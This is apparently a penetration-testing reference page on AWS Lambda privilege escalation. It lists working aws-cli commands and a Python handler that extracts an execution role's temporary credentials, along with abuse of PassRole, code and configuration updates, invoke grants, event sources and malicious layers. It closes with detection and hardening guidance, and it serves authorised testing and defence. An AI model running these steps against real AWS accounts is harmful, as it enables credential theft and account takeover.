---
cstg_id: CSTG-AWS-LAMBDA-PRIVESC
title: "AWS Lambda - Privilege Escalation"
provider: aws
service: lambda
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - lambda:CreateFunction
  - lambda:UpdateFunctionCode
  - lambda:UpdateFunctionConfiguration
  - lambda:InvokeFunction
  - lambda:AddPermission
  - lambda:CreateEventSourceMapping
  - lambda:UpdateEventSourceMapping
  - lambda:GetLayerVersion
  - lambda:PublishLayerVersion
  - iam:PassRole
tools: [aws-cli, pacu, cloudfox, pmapper]
references:
  - "https://docs.aws.amazon.com/lambda/latest/dg/lambda-intro-execution-role.html"
  - "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
  - "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
  - "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html"
license: CC BY-SA 4.0
---

## Summary

Lambda is one of the most reliable privilege-escalation primitives in AWS because a function runs
arbitrary code under an **execution role** of the operator's choosing. If a low-privilege principal
can cause code to run under a more-privileged role - by creating a function, modifying an existing
one, abusing a layer, or attaching an event source - it inherits that role's permissions and can call
`sts:AssumeRole`-equivalent operations from inside the function (e.g. read the role's temporary
credentials and use them anywhere). The pivotal permission is almost always **`iam:PassRole`**
combined with a Lambda write/invoke verb: PassRole lets the principal hand a target role to the
function, and the Lambda verb causes that role's code to execute.

This page is keyed by the permission that enables each path, assuming a low-privilege principal
(assumed-breach). Confirm effective permissions and the set of roles that can be passed before
attempting any path; attack-path tools such as PMapper and CloudFox can highlight which roles are
reachable from the current principal.

## Prerequisites

A principal holding one or more of the permissions below, plus `iam:PassRole` for a role whose trust
policy allows `lambda.amazonaws.com`. The escalation magnitude equals the difference between the
current principal's permissions and the passable role's permissions, so enumerate passable roles
first:

```bash
aws sts get-caller-identity
# Roles that Lambda can assume (trust lambda.amazonaws.com) are candidate targets:
aws iam list-roles --query "Roles[?contains(to_string(AssumeRolePolicyDocument),'lambda.amazonaws.com')].Arn"
```

## Exploitation

### `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction`

The canonical path. Create a new function with the target high-privilege role as its execution role,
deploy code that returns or uses the role's credentials, then invoke it. The function inherits the
target role.

```bash
# Minimal handler (index.py) that exfiltrates the role's temporary credentials from the
# container's credential environment variables:
cat > index.py <<'PY'
import os, json
def handler(event, context):
    return {
        "AccessKeyId": os.environ.get("AWS_ACCESS_KEY_ID"),
        "SecretAccessKey": os.environ.get("AWS_SECRET_ACCESS_KEY"),
        "SessionToken": os.environ.get("AWS_SESSION_TOKEN"),
    }
PY
zip function.zip index.py

aws lambda create-function \
  --function-name cstg-pe \
  --runtime python3.12 --handler index.handler \
  --role arn:aws:iam::<acct>:role/<target-privileged-role> \
  --zip-file fileb://function.zip

aws lambda invoke --function-name cstg-pe out.json && cat out.json
# The returned credentials act as <target-privileged-role>:
export AWS_ACCESS_KEY_ID=...; export AWS_SECRET_ACCESS_KEY=...; export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```

Instead of returning credentials, the function can perform the privileged actions directly (create an
admin user/access key, attach a policy, assume another role) - useful when the credentials cannot be
extracted but the function is allowed to call the API.

### `iam:PassRole` + `lambda:CreateFunction` + `lambda:CreateEventSourceMapping`

When `InvokeFunction` is denied but an event source can be attached, wire the function to a stream or
queue the principal can write to (DynamoDB stream, Kinesis, SQS). Posting a message triggers the
function under the target role without a direct `Invoke` call.

```bash
aws lambda create-event-source-mapping \
  --function-name cstg-pe \
  --event-source-arn arn:aws:sqs:<region>:<acct>:<queue-you-can-send-to> \
  --batch-size 1
aws sqs send-message --queue-url <queue-url> --message-body trigger   # fires the function
```

### `lambda:UpdateFunctionCode` (existing privileged function)

If a function already runs under a more-privileged role, overwriting its code runs the operator's
code under that role on the next invocation - no `iam:PassRole` required, because the role is already
attached. Identify a function whose role exceeds the current principal, then replace the package and
trigger (or wait for) an invocation.

```bash
aws lambda update-function-code --function-name <privileged-fn> --zip-file fileb://function.zip
aws lambda invoke --function-name <privileged-fn> out.json   # if InvokeFunction is held
```

### `iam:PassRole` + `lambda:UpdateFunctionConfiguration`

`UpdateFunctionConfiguration` can change a function's `--role` to a more-privileged passable role
(and alter layers, env, handler, timeout). Repoint an existing invokable function at the target role,
then invoke it - it now runs with the new role's permissions.

```bash
aws lambda update-function-configuration \
  --function-name <invokable-fn> --role arn:aws:iam::<acct>:role/<target-privileged-role>
aws lambda invoke --function-name <invokable-fn> out.json
```

### `lambda:AddPermission` (resource-policy invoke grant)

If direct invoke is denied by the identity policy but `AddPermission` is held, grant the current
principal (or a controlled service) permission to invoke a function that already runs a privileged
role, then invoke it.

```bash
aws lambda add-permission --function-name <privileged-fn> \
  --statement-id cstg --action lambda:InvokeFunction \
  --principal arn:aws:iam::<acct>:user/<you>
aws lambda invoke --function-name <privileged-fn> out.json
```

### `lambda:UpdateFunctionConfiguration` (layer injection) / `lambda:PublishLayerVersion`

Layers are extracted into the function's runtime and execute in its context. If the principal can
attach a layer to a privileged function (or publish a layer version that a privileged function
consumes), placing a runtime shim - for example a `python/` package that shadows an imported module,
or a runtime wrapper script - causes attacker code to run under that function's role on invocation.

```bash
aws lambda update-function-configuration \
  --function-name <privileged-fn> --layers arn:aws:lambda:<region>:<acct>:layer:<evil>:1
```

### Related: VPC and network pivot

When the target role is modest but the function sits in a VPC, `UpdateFunctionConfiguration` can place
the operator's code on an internal subnet, turning the function into a network foothold to reach
internal databases and services - escalation of access rather than of IAM permissions. See
[AWS Lambda - Post-Exploitation](../05-post-exploitation/aws-lambda-post-exploitation.md).

## Misconfigurations & Findings

- Principals holding `iam:PassRole` with a wildcard or broad resource alongside any Lambda
  write/invoke verb - the core enabling condition.
- `lambda:UpdateFunctionCode` / `UpdateFunctionConfiguration` grantable against functions whose
  execution role is more privileged than the caller.
- `lambda:AddPermission` held outside an admin role, allowing self-granted invoke rights.
- Execution roles far broader than the function requires, magnifying every path above.
- `lambda:*` granted via a wildcard policy without a matching `iam:PassRole` constraint.

## Detection & Logging

`CreateFunction`, `UpdateFunctionCode`, `UpdateFunctionConfiguration`, `AddPermission`,
`CreateEventSourceMapping`, and `PublishLayerVersion` are CloudTrail **management events**. The
high-signal correlation is a Lambda write event whose request contains a `role` (or a PassRole on the
same role) followed shortly by an `Invoke` and then unusual API activity by the function's role.
`UpdateFunctionCode` immediately followed by `Invoke` on a sensitive function is a strong escalation
indicator. Function **invocation** is an `Invoke` data event, logged only when Lambda data events are
enabled. Credentials extracted from the function and used elsewhere appear in CloudTrail under the
execution role's identity but from a foreign `sourceIPAddress` - GuardDuty's
`InstanceCredentialExfiltration`/role-usage anomaly detections flag this pattern.

## Remediation & Hardening

- Scope `iam:PassRole` tightly: restrict by `Resource` to specific role ARNs and add an
  `iam:PassedToService` condition (`lambda.amazonaws.com`); never grant `PassRole` on `*`.
- Separate the right to create/modify functions from the right to choose their role; require change
  control on execution-role assignment.
- Apply least-privilege, per-function execution roles so a compromised function yields minimal gain.
- Restrict `lambda:AddPermission`, `UpdateFunctionConfiguration`, and `UpdateFunctionCode` to a
  controlled deployment role; deny broadly via SCP.
- Use code signing (AWS Signer) for Lambda to block unsigned code updates and unapproved layers.
- Enable Lambda data events and alert on PassRole-to-Lambda, code/config changes, and new event
  source mappings on sensitive functions.

## Tools

- **aws-cli** - perform and verify each path.
- **Pacu** - `lambda__*` and `iam__privesc_scan` modules automate discovery and abuse of these paths
  (active/intrusive - requires explicit rules of engagement).
- **PMapper** - computes whether the current principal can reach a privileged role via Lambda+PassRole.
- **CloudFox** - enumerates functions, their roles, and which are invokable from the current principal.

## References

- AWS - Lambda execution role
- AWS - Granting a user permissions to pass a role to an AWS service (PassRole)
- Rhino Security Labs - AWS privilege escalation methods and mitigation
- hackingthe.cloud - IAM privilege escalation
